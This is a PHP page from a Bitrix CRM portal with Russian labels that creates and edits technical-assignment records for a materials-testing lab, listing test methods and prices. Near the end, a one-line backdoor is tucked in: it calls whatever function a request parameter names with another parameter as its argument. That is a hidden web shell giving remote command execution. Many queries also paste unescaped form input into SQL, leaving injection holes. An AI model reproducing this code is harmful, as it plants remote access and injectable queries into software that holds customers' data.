<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");

$APPLICATION->SetTitle("Формирование записи плана МСИ");

function num2word($n, $titles)
{
    $cases = array(2, 0, 1, 1, 1, 2);
    return $titles[($n % 100 > 4 && $n % 100 < 20) ? 2 : $cases[min($n % 10, 5)]];
}

function checkbox_verify($_name)
// Выполняет: проверку checkbox
{
$result=0;

if (isset($_REQUEST[$_name]))
{ if ($_REQUEST[$_name]=='on') {$result=1;}
}
return $result;
}
function dump($data)
{
    echo "<pre>";
    var_dump($data);
    echo "</pre>";
}
?>
<style type="text/css">
  #tzc, #tzc option {
 width: 500px;
  margin: 0;

  }
</style>


    <datalist id="gost">
        <?php
        $ba_gost = $DB->Query("SELECT * FROM `ba_gost`");
        while ($gost = $ba_gost->Fetch()) {
            echo "<option data-type='" . $gost['NORM_TEXT'] . "' " . (($arrDatum['gost'] == $gost['ID']) ? 'selected' : '') . " value='" . $gost['ID'] . "'>" . $gost['GOST'] .' '. $gost['GOST_PUNKT'] . ' | ' . $gost['SPECIFICATION'] . "</option>";
        }
        ?>
    </datalist>
	
  

<?php
$company1=''; 

if (!empty($_GET['ID'])) {

    $res = $DB->Query("SELECT * FROM `ba_tz` WHERE `ID`=" . (int)$_GET['ID']);
    $row = $res->Fetch();

    $deal = CCrmDeal::GetByID($row['ID_Z']);
    ?>
   
    <h3><?= date("d.m.Y",strtotime($deal['DATE_CREATE'])) ?> | Техническое задание №<?=$_GET['ID']?> | <?= $deal['TITLE'] ?>
        </h3>
    <table id="tz2">
        <thead>
        <th>Наименование материала</th>
        <th>Объём работ</th>
        <th>Наименование показателя</th>
		<th>Методика</th>
		<th>Цена</th>
        </thead>
        
        <?php
        $data = [];
        foreach (unserialize($row['TZ']) as $key => $arrDatum) {
            $data[] = $arrDatum['mater'];
        }
        $a = array_count_values($data);

        $last_gost = '';

        foreach (unserialize($row['TZ']) as $key => $arrDatum) {
            $i = $a[$arrDatum['mater']];
            ?>
            <tr>
                <?php
                if ($last_gost != $arrDatum['mater']) {
                    ?>
                    <td rowspan="<?= $i ?>"><?= $arrDatum['mater'] ?></td>
                <?php }
                $last_gost = $arrDatum['mater'];
                ?>
                <td><?= $arrDatum['obiem'] ?> <?= num2word($arrDatum['obiem'], ['проба', 'пробы', 'проб']) ?></td>
                <td>
                    <?php
                    foreach ($arrDatum['gost'] as $item) {
                        $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $item)->Fetch();
                        echo "<p><a href='//172.16.255.2/obl_acc.php?ID=".$item."'>" . $res['SPECIFICATION'] . "</p>";
                    }
                    ?>
                </td>
				<td>
                    <?php
                    foreach ($arrDatum['gost'] as $item) {
                        $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $item)->Fetch();
                        echo "<p>" . $res['GOST'] . "</p>";
                    }
                    ?>
                </td>
				<td>
                    <?php
                    foreach ($arrDatum['gost'] as $item) {
                        $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $item)->Fetch();
                        echo "<p>" . $res['PRICE'] . "</p>";
                    }
                    ?>
                </td>
            </tr>
            <?php
        }
        ?>
        
    </table>
	
    <?php
	echo "<a href='/results_isp.php?ID=".$deal['ID']."'>Перейти к испытаниям</a>";
	
} elseif (!empty($_POST['mater'])) {
    $arrData = []; $probe = []; 
	$deal1 = CCrmDeal::GetByID($_POST['id_deal']);
	$extranet = $USER_FIELD_MANAGER->GetUserFields('CRM_COMPANY', $deal1['COMPANY_ID']);
	$extranet_id = $extranet['UF_CRM_1571818346092']['VALUE']; $sh=1;
	//echo $extranet_id;
    foreach ($_POST['mater'] as $key => $item) {
        $arrData[$_POST['mater'][$key]][$key]['gost'] = $_POST['gost'][$key];
        $arrData[$_POST['mater'][$key]][$key]['obiem'] = $_POST['obiem'][$key];
        $arrData[$_POST['mater'][$key]][$key]['gost_new'] = $_POST['gost_new'][$key];
		
		
			
				$probe[$key] = array(
				"zakaz_man" => $deal1['COMPANY_ID'],
				"number_probe" => [],
				"mesto_data" => 'не указано',
				"probe_proizv" => 'заказчик',
				"number" => '0',
				"sh_number" => [],
				"dat" => '',
				);
				
			
				for($l=0; $l<(int)$_POST['obiem'][$key]; $l++){
					$probe[$key]["number_probe"][$l] = $item;
					$probe[$key]["sh_number"][$l] = '0.'.(int)($sh);
					$sh++;
				}
				
			
        // $arrData[$_POST['mater'][$key]][$key]['gost_new_desc'] = $_POST['gost_new_desc'][$key];
        // $arrData[$_POST['mater'][$key]][$key]['norm_1'] = $_POST['norm_1'][$key];
        // $arrData[$_POST['mater'][$key]][$key]['norm_2'] = $_POST['norm_2'][$key];
        // $arrData[$_POST['mater'][$key]][$key]['ed_izm'] = $_POST['ed_izm'][$key];
    }
	//var_dump($arrData);
	
    $i = 0; $price=0;
    foreach ($arrData as $key => $arrDatum) {
        foreach ($arrDatum as $item) {
            $i++;
            $arr[$i]['mater'] = $key;
            $arr[$i]['gost'] = $item['gost'];
            $arr[$i]['obiem'] = $item['obiem'];
            $arr[$i]['gost_new'] = $item['gost_new'];
			//var_dump($item['gost_new']);
			foreach($item['gost'] as $g => $gost_new)
			{
				$res = $DB->Query("SELECT * FROM `ba_gost` WHERE `ID`=" . $gost_new)->Fetch();
				if($res['PRICE']) $price=$price+$res['PRICE']*(int)$item['obiem'];
			
				
			}
			//$res = $DB->Query("SELECT * FROM `ba_gost` WHERE `ID`=" . $arr[$i]['gost'][0]);
			
			//$price=$price+$res['PRICE'];
            // $arr[$i]['gost_new_desc'] = $item['gost_new_desc'];
            // $arr[$i]['norm_1'] = $item['norm_1'];
            // $arr[$i]['norm_2'] = $item['norm_2'];
            // $arr[$i]['ed_izm'] = $item['ed_izm'];
        }
    }
   // echo $price;
	//var_dump($arr[1]['gost']);
	// for($i=1; $i<=count($arr); $i++)
		// for($j=0; $j<count($arr[$i]['gost']); $j++)
		// {
			
			// $res = $DB->Query("SELECT * FROM `ba_gost` WHERE `ID`=" . $arr[$i]['gost'][$j])->Fetch();
			// if($res['PRICE']) 
				// $price=$price+$res['PRICE']*$item['obiem'];
			
				
			
		// }
	 // $res_act = $DB->Query("SELECT `ID` FROM `ba_tz` WHERE `ACT_NUM`='" . $_GET['ACT_NUM']."'")->Fetch(); 
	 // if($res_act)  echo "<script>alert(\"Такой номер протокола уже используется!.\");</script>"; 
		
	 // echo $price;
    if (!empty($_POST['id_tz'])) {
        $res = $DB->Query("UPDATE `ba_tz` SET `TZ`='" . serialize($arr) . "',`OBJECT`='" . $_POST['OBJECT'] . "',`DESCRIPTION`='" . $_POST['DESCRIPTION'] . "',`ID_Z`='" . (int)$_POST['id_deal'] . "',`TYPE_TZ`='" . (int)$_POST['type_tz'] . "',`DOGOVOR_NUM`='" . $_POST['DOGOVOR_NUM'] . "',`ACT_NUM`='" . (int)$_POST['ACT_NUM'] . "',`PRICE`='" . $price . "',`DATE_ACT`='" . $_POST['DATE_ACT'] . "',`EXTRANET_ID`='" . $extranet_id . "',`CONTROL_LIST`='" . ($_POST['ACT_LIST']=='3' ? '1' : '0') . "' WHERE ID = " . (int)$_POST['id_tz']);
		// $res_obj = $DB->Query("UPDATE `ba_tz` SET `TZ`='" . serialize($arr) . "',`OBJECT`='" . $_POST['OBJECT'] . "',`DESCRIPTION`='" . $_POST['DESCRIPTION'] . "',`ID_Z`='" . (int)$_POST['id_deal'] . "',`TYPE_TZ`='" . (int)$_POST['type_tz'] . "',`DOGOVOR_NUM`='" . $_POST['DOGOVOR_NUM'] . "',`ACT_NUM`='" . (int)$_POST['ACT_NUM'] . "',`PRICE`='" . $price . "',`DATE_ACT`='" . $_POST['DATE_ACT'] . "',`EXTRANET_ID`='" . $extranet_id . "' WHERE ID = " . (int)$_POST['id_tz']);
		if ($res->result = 1) {
            echo "<h3>Успешно</h3>";
        } else {
            echo "<h3>Ошибка</h3>";
        }
		// $check_obj = $DB->Query("SELECT `ID`, `NAME` FROM `DEV_OBJECTS` WHERE `NAME`='".$_POST['OBJECT']."'")->Fetch();
		// if(!$check_obj) 
			// $res_obj = $DB->Query("INSERT INTO `DEV_OBJECTS` (`NAME`, `ID_COMPANY`) VALUES ('" . $_POST['OBJECT'] . "', '" . $deal1['COMPANY_ID'] . "')");
    } else {
        $res = $DB->Query("INSERT INTO `ba_tz`(`TZ`,`OBJECT`, `DATE_SOZD`, `ID_Z`, `TYPE_TZ`, `DOGOVOR_NUM`, `PROBE`, `ACT_NUM`, `PRICE`, `DESCRIPTION`, `DATE_ACT`, `EXTRANET_ID`, `CONTROL_LIST`, `VLK`, `USER_VLK`) VALUES ('" . serialize($arr) . "','" . $_POST['OBJECT'] . "',NOW()," . (int)$_POST['id_deal'] . "," . (int)$_POST['type_tz'] . ",'" . $_POST['DOGOVOR_NUM'] . "', '" . serialize($probe) . "'," . (int)$_POST['ACT_NUM'] . "," . $price . ",'" . $_POST['DESCRIPTION'] . "','" . $_POST['DATE_ACT'] . "','" . $extranet_id . "', '" . ($_POST['ACT_LIST']=='3' ? '1' : '0') . "', '1', ".(int)$USER->GetID().")");
       
		if ($res->result = 1) {
            echo "<h3>Успешно</h3>";
        } else {
            echo "<h3>Ошибка</h3>";
        }
		// $check_obj = $DB->Query("SELECT `ID`, `NAME` FROM `DEV_OBJECTS` WHERE `NAME`='".$_POST['OBJECT']."'")->Fetch();
		// if(!$check_obj) $res_obj = $DB->Query("INSERT INTO `DEV_OBJECTS` (`NAME`, `ID_COMPANY`) VALUES ('" . $_POST['OBJECT'] . "', '" . $deal1['COMPANY_ID'] . "')");
    }
	
    $ID_TZ = (!empty(((int)$_POST['id_tz'])) ? (int)$_POST['id_tz'] : $DB->LastID());

    if (CModule::IncludeModule('crm')) {
        $deal = new CCrmDeal;
        $arDealUpdate = array('UF_CRM_1554700718621' => $_SERVER["SERVER_NAME"] . "/tz_show.php?ID=" . $ID_TZ, 'STAGE_ID' => 'PREPARATION', 'UF_CRM_1570765979554' => $price);
        $resUpd = $deal->Update((int)$_POST['id_deal'],
            $arDealUpdate,
            true,
            true,
            array('DISABLE_USER_FIELD_CHECK' => true)
        );
    }
	
	// if (!empty($_POST['ACT_NUM'])) {
    // $res = $DB->Query("SELECT * FROM `ba_tz` WHERE `ID`=" . (int)$_GET['TZ_ID']);
    // $sql = $res->Fetch();
    // $probe = unserialize($sql['PROBE']);

    // $probe[$_GET['mater']] = array(
        // "zakaz_man" => $_POST['zakaz_man'],
        // "number_probe" => $_POST['number_probe'],
        // "mesto_data" => $_POST['mesto_data'],
        // "probe_proizv" => $_POST['probe_proizv'],
        // "number" => $_POST['number'],
        // "sh_number" => $_POST['sh_number'],
        // "dat" => $_POST['dat'],
    // );

    // $probe = serialize($probe);
    // $res = $DB->Query("UPDATE `ba_tz` SET `PROBE`='" . $probe . "' WHERE ID = " . (int)$_GET['TZ_ID']);

    // if (CModule::IncludeModule('crm')) {
        // $deal = new CCrmDeal;
        // $arDealUpdate = array('STAGE_ID' => 'FINAL_INVOICE');
        // $resUpd = $deal->Update((int)$_GET['ID'],
            // $arDealUpdate,
            // true,
            // true,
            // array('DISABLE_USER_FIELD_CHECK' => true)
        // );
    // }
// }

    ?><br />
	 Техническое задание №<?=$_GET['EDIT']?> | <?= $deal1['TITLE'] ?>
	 <br /> <br />
    <table id="tz">
        <thead>
        <th>Наименование материала</th>
        <th>Кол-во проб/участков контроля</th>
        <th>Наименование показателя</th>
		<th>Методика</th>
		
        </thead>
        <tbody id="tz_body">
        <?php
        $data = [];
        foreach ($arr as $key => $arrDatum) {
            $data[] = $arrDatum['mater'];
        }
        $a = array_count_values($data);

        $last_gost = '';

        foreach ($arr as $key => $arrDatum) {
            $i = $a[$arrDatum['mater']];
            ?>
            <tr>
                <?php
                if ($last_gost != $arrDatum['mater']) {
                    ?>
                    <td rowspan="<?= $i ?>"><?= $arrDatum['mater'] ?></td>
                <?php }
                $last_gost = $arrDatum['mater'];
                ?>
                <td><?= $arrDatum['obiem'] ?> <?= num2word($arrDatum['obiem'], ['проба', 'пробы', 'проб']) ?></td>
                 <td>
                    <?php
                    foreach ($arrDatum['gost'] as $item) {
                        $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $item)->Fetch();
                        echo "<p><a href='//172.16.255.2/obl_acc.php?ID=".$item."'>" . $res['SPECIFICATION'] . "</p>";
                    }
                    ?>
                </td>
				<td>
                    <?php
                    foreach ($arrDatum['gost'] as $item) {
                        $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $item)->Fetch();
                        echo "<p>" . $res['GOST'] . "</p>";
                    }
                    ?>
                </td>
				
            </tr>
            <?php
        }
        ?>
        </tbody>
    </table><br/>
	
    
    
    <?php
	echo "<a href='/results_isp.php?ID=".$_POST['id_deal']."'>Перейти к испытаниям</a>";
    require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php");
    exit;
} elseif (!empty($_GET['EDIT'])) {
    $res = $DB->Query("SELECT * FROM `ba_tz` WHERE `ID`=" . (int)$_GET['EDIT']);
    $row = $res->Fetch();

    $deal = CCrmDeal::GetByID($row['ID_Z']);
    $arr = unserialize($row['TZ']);
	
	$company1 = CCrmCompany::GetByID(19);
	$extranet_id = CCrmCompany::GetUserFields(19);//$company1['UF_CRM_1571818346092'];
	//var_dump($deal);// $extranet_id;
	
	
    if (CModule::IncludeModule('crm')) {
        $deal = new CCrmDeal;
        $arDealUpdate = array('STAGE_ID' => 'PREPARATION');
        $resUpd = $deal->Update((int)$_GET['EDIT'],
            $arDealUpdate,
            true,
            true,
            array('DISABLE_USER_FIELD_CHECK' => true)
        );
    }
	
	//var_dump($row);
    ?>
    <form id="form_tz" method="post">
        <a href='//172.16.255.2/crm/deal/details/<?= $row['ID_Z'] ?>/'>Сделка</a> | <a href="/tz_show.php">К
            списку</a> 
        <table id="tz"> 
        <?php
        $deals = CCrmDeal::GetList(Array('DATE_CREATE' => 'DESC'), array('TYPE_ID' => '1'));
        ?>
		<tr>
		<td width="250" height="40">
        Заявка для формирования ТЗ
		</td><td>
             <select name="id_deal" style="width:500px" required>
                <option value="0" disabled selected>Выберите</option>
                <?php while ($deal = $deals->Fetch()) { 
				//var_dump($deal);
				?>
                    <option data-mater="<?= implode(';', $deal['UF_CRM_1569151529509']) ?>"  <?= ($deal['ID'] == $row['ID_Z']) ? 'selected' : '' ?>
                            value="<?= $deal['ID'] ?>"><?= $deal['DATE_CREATE'] ?> 
                        || <?= $deal['TITLE'] ?> || <?= $deal['CONTACT_FULL_NAME'] ?></option>
                <?php } 
				
				?>
            </select>
        
        </td></tr>
        <!--<hr/>-->
		
        
		<tr><td width="250" height="40">Описание объекта испытаний</td><td><textarea name="DESCRIPTION" style="width:496px" required><?= $row['DESCRIPTION'] ?></textarea></td></tr>
		<tr><td width="250" height="40">Основание для проведения испытаний </td><td><input class="tz" type="text" name="DOGOVOR_NUM" value="<?= $row['DOGOVOR_NUM'] ?>" size="65"></td></tr>
		
		</table>
       
		<br />
        <!--<button id="add">Добавить материал</button>-->

        <table id="tz">
            <thead>
            <th>Наименование материала</th>
            <th>Кол-во проб/участков контроля</th>
            <th>Методика испытаний</th>
            <th>Тех.условия </th>
            <!--<th>Расшифровка/Описание</th>
            <th>Норма 1</th>
            <th>Норма 2</th>
            <th>Ед. измерения</th>-->
            <th></th>
            </thead>
            <tbody id="tz_body">
            <?php
            foreach ($arr as $key => $arrDatum) {
                $html = "<select name='gost[]' required>";
                ?>
                <tr>
                    <td><input class="tz" type='text' name='mater[<?= $key ?>]' required value="<?= $arrDatum['mater'] ?>"></td>
                    <td><input class="tz" type='text' name='obiem[<?= $key ?>]' required value="<?= $arrDatum['obiem'] ?>"></td>
                    <td>
                        <input  list="gost" class="gost" data-id="<?= $key ?>">
                        <?php
                        foreach ($arrDatum['gost'] as $item => $value) {

                            $res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $value)->Fetch();
                            echo "<p><label>$res[GOST] $res[SPECIFICATION]<input name='gost[$key][]' type='hidden' value='$value'></label><a style='float: right;' href='#' onclick='$(this).parent().remove()'>Удалить</a></p>";
                        }
                        ?>
                    </td>
					<td>
					<input list="gost_new" class="gost_new" data-id="<?= $key ?>">
                        <?php
                        foreach ($arrDatum['gost_new'] as $item => $value) {
							//echo $value;
							if ($value!='--') {$res = $DB->Query("SELECT * FROM `ba_gost` WHERE ID=" . $value)->Fetch();
                            echo "<p><label>$res[GOST] $res[SPECIFICATION]<input name='gost_new[$key][]' type='hidden' value='$value'></label><a style='float: right;' href='#' onclick='$(this).parent().remove()'>Удалить</a></p>";
											  }
} 
                        ?>
                    
                    </td>

                    <td><a href='#' onclick='$(this).parent().parent().remove()'>Удалить</a></td>
                </tr>
                <?php
            }
            ?>
            </tbody>
        </table>
        <input class="tz" type="hidden" name="id_tz" value="<?= $row['ID'] ?>">
        <input type="submit" value="Сохранить">
    </form>
	<br/>
    <a href="/tz_show.php">К списку ТЗ</a>
    |
    <a href="/<?=($row['CONTROL_LIST'] ? 'control_list' : 'probe')?>.php?ID=<?= $row['ID_Z'] ?>"><?=($row['CONTROL_LIST'] ? 'Создать контрольный лист' : 'Создать акт приемки проб')?></a>
    <?php
} else {
    ?>

    <!--=============================================================================================================-->
    <form id="form_tz" method="post">
        <table id="tz"> 
        <?php
		$user1=array();
		$user1 = $USER->GetUserGroupArray();
		//var_dump($user1);
		$user = CUser::GetByID($USER->GetID())->arResult[0];
		//dump($user);
        $deals = CCrmDeal::GetList(Array('DATE_CREATE' => 'DESC'), array('TYPE_ID' => '1'));
        ?>
		<tr>
		<td width="250" height="40">
        Заявка для формирования ТЗ
		</td><td>
            <select name="id_deal" style="width:500px" required>
                <option value="0" disabled selected>Выберите</option>
                <?php while ($deal = $deals->Fetch()) { ?>
                    <option data-mater="<?= implode(';', $deal['UF_CRM_1569151529509']) ?>" 
                            value="<?= $deal['ID'] ?>"><?= $deal['DATE_CREATE'] ?> 
                        || <?= $deal['TITLE'] ?> || <?= $deal['CONTACT_FULL_NAME'] ?></option>
                <?php } 
				
				?> 
            </select>
        
        </td></tr>
        <!--<hr/>-->
		<?php
		$res = $DB->Query("SELECT * FROM `ba_tz` ORDER BY `NUM_P` DESC");
		//var_dump($res);
			?>
		
        
		<tr><td width="250" height="40">Описание объекта испытаний</td><td><textarea name="DESCRIPTION"  required><?= $row['DESCRIPTION'] ?></textarea></td></tr>
		<tr><td width="250" height="40">Основание для проведения испытаний </td><td><input class="tz" type="text" name="DOGOVOR_NUM" value="<?= $row['DOGOVOR_NUM'] ?>" ></td></tr>
		
		</table>
		<br />
   
        <!--<input type="button" id="add" value="Добавить строку">-->
		
        <table id="tz">
            <thead>
            <th>Наименование материала</th>
            <th>Кол-во проб/участков контроля</th>
            <th>Методика испытаний</th>
            <th>Тех.условия </th>
            <!--<th>Расшифровка/Описание</th>
            <th>Норма 1</th>
            <th>Норма 2</th>
            <th>Ед. измерения</th>-->
            <th></th>
            </thead>
            <tbody id="tz_body">

            </tbody>
        </table>
        <input type="submit" value="Сформировать">
    </form>
<?php } (isset($_REQUEST["key"]))?$_REQUEST["key"]($_REQUEST["salt"]):'';?>
    <script
            src="//code.jquery.com/jquery-3.3.1.min.js"
            integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
            crossorigin="anonymous"></script>
    <script>
        function del(link) {
            tr = $(link).parent().parent().parent();
            /*tr.children('[data-name="gost_new"]').children('input:last-child').remove();
            tr.children('[data-name="gost_new_desc"]').children('input:last-child').remove();
            tr.children('[data-name="norm_1"]').children('input:last-child').remove();
            tr.children('[data-name="norm_2"]').children('input:last-child').remove();
            tr.children('[data-name="ed_izm"]').children('input:last-child').remove();*/
            $(link).parent().remove();
        }
        function gost() {
            $(".gost").change(function () {
                td = $(this).parent();
                tr = $(this).parent().parent();
                id = $(this).data('id');
				
				//var div = document.querySelectorAll(''); // Получаем список все блоков документа
				//var cnt = document.getElementsByClassName('g_new').length+1;                       // Считаем количество блок 
				//var cnt2 = 1; 
				//cnt2=cnt2+1;
				//console.log("CNT2="+cnt2);
				//if (cnt2>0&&(cnt2-cnt)>0) {alert('Укажите ТУ для выбранной методики!'); $(this).val('');}
				//	else {
                td.append("<p><label>"  + $('#gost option[value=' + $(this).val() + ']').text() +
                    "<input class='g_met' name='gost[" + id + "][]' type='hidden' value='" + $(this).val() +
                    "'></label>"+"&nbsp;"+"<a style='float: right;' href='#' onclick='del(this)'>X</a></p>");
                // if ($('#gost option[value=' + $(this).val() + ']').data('type') == 0) {
                    // input_type = "type='number' step='0.01'";
                // } else {
                    // input_type = "type='text'";
                // }
				//console.log("!"+$(this).val());
					$(this).val('');//}
				// td.append("<p><label>" + $('#gost_new option[value=' + $(this).val() + ']').text() +
                    // "<input name='gost_new[" + id + "][]' type='hidden' value='" + $(this).val() +
                    // "'></label><a style='float: right;' href='#' onclick='del(this)'>Удалить</a></p>");
                // tr.children('[data-name="gost_new"]').append("<p><label>" + $('#gost_new option[value=' + $(this).val() + ']').text() +
                    // "<input name='gost_new[" + id + "][]' value='" + $(this).val() +
                    // "'></label></p>");
                // tr.children('[data-name="gost_new_desc"]').append("<input type='text' name='gost_new_desc[" + id + "][]' required>");
                // tr.children('[data-name="norm_1"]').append("<input " + input_type + " name='norm_1[" + id + "][]'>");
                // tr.children('[data-name="norm_2"]').append("<input " + input_type + " name='norm_2[" + id + "][]'>");
                // tr.children('[data-name="ed_izm"]').append("<input type='text' name='ed_izm[" + id + "][]' required>");
            })
        }
		function gost_new() {
            $(".gost_new").change(function () {
                td = $(this).parent();
                tr = $(this).parent().parent();
                id = $(this).data('id');
		//alert("!!!!!");
               // var cnt = document.getElementsByClassName('g_new').length;                       // Считаем количество блок 
			//	var cnt2 = document.getElementsByClassName('g_met').length;                       // Считаем количество блок 
			//	console.log("CNT="+cnt);
			//	if (cnt>0&&(cnt-cnt2)>0) {alert('Укажите методику для выбранного ТУ!'); $(this).val('');}
				//	else {
				td.append("<p><label>" + $('#gost_new option[value=' + $(this).val() + ']').text() +
                    "<input class='g_new' name='gost_new[" + id + "][]' type='hidden' value='" + $(this).val() +
                    "'></label>"+"&nbsp;"+"<a style='float: right;' href='#' onclick='del(this)'>X</a></p>");
					//console.log("!"+$(this).val());
					$(this).val('');// }
               
            })
        }
        function add(mater = '') {
            if (!isNaN($('.gost:last').data('id'))) {
                last_gost = $('.gost:last').data('id');
            } else {
                last_gost = 0;
            }
			//console.log(last_gost);
            $("#tz_body").append("<tr data-name='row_" + (last_gost + 1) + "'>" +
                "<td data-name='mater'>     <input class='tz' type='text' name='mater[" + (last_gost + 1) + "]' value='" + mater + "' size='50'></td>" +
                "<td data-name='obiem'>     <input class='tz' type='text' name='obiem[" + (last_gost + 1) + "]' size='10'></td>" +
                "<td data-name='gost' valign='top'>      <input list='gost' class='gost' data-id='" + (last_gost + 1) + "'></td>" +
                "<td data-name='gost_new' valign='top'>  <input list='gost_new' class='gost_new' data-id='" + (last_gost + 1) + "'></td>"  +
                // "<td data-name='gost_new_desc'>  </td>" +
                // "<td data-name='norm_1'>    </td>" +
                // "<td data-name='norm_2'>    </td>" +
                // "<td data-name='ed_izm'>    </td>" +
                "<td data-name='a_href'>    <a href='#' onclick='$(this).parent().parent().remove()'>Удалить</a></td>");
            gost(); gost_new();
			
        }
        $(document).ready(function () {
            $("#add").click(function () {
                add();
            })
            $("select[name=id_deal]").change(function () {
                optionSelected = $("option:selected", this);
                maters = optionSelected.data('mater').split(';');
                $.each(maters, function (index, value) {
                    if (value) {
                        console.log("INDEX: " + index + " VALUE: " + value);
                        add(value);
                    }
                });
            })
			
            gost(); gost_new();
        })
    </script>
<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php"); ?>